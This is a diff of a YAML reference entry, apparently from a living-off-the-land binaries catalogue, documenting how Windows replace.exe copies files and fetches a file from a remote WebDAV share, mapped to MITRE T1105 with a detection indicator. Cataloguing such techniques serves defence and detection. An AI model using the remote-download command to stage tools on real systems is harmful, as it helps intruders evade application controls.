@@ -1,32 +1,36 @@
 ---
-name: Replace.exe
-description: Used to replace file with another file
-functions:
-  download:
-    - description: Download/Copy bar.exe to outdir
-      code: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
-      mitreid: T1105
-      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
-      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-      privileges: User
-      usecase: Download file
-  copy:
-    - description: Copy file.cab to destination
-      code: replace.exe C:\Source\File.cab C:\Destination /A
-      mitreid: T1105
-      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
-      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-      privileges: User
-      usecase: Copy files
-resources:
-    - resource: https://twitter.com/elceef/status/986334113941655553
-    - resource: https://twitter.com/elceef/status/986842299861782529
-fullpath:
-    - path: C:\Windows\System32\replace.exe
-    - path: C:\Windows\SysWOW64\replace.exe
-detection:
-  - IOC: Replace.exe getting files from remote server
-acknowledgement:
+Name: Replace.exe
+Description: Used to replace file with another file 
+Author: 'Oddvar Moe'
+Created: '2018-05-25'
+Commands:
+  - Command: replace.exe C:\Source\File.cab C:\Destination /A
+    Description: Copy file.cab to destination
+    Usecase: Copy files 
+    Category: Copy
+    Privileges: User
+    MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+    Description: Download/Copy bar.exe to outdir
+    Usecase: Download file 
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+Full_Path:
+  - Path: C:\Windows\System32\replace.exe
+  - Path: C:\Windows\SysWOW64\replace.exe
+Code_Sample: 
+- Code:
+Detection:
+ - IOC: Replace.exe getting files from remote server
+Resources:
+  - Link: https://twitter.com/elceef/status/986334113941655553
+  - Link: https://twitter.com/elceef/status/986842299861782529
+Acknowledgement:
   - Person: elceef
     Handle: '@elceef'
 ---
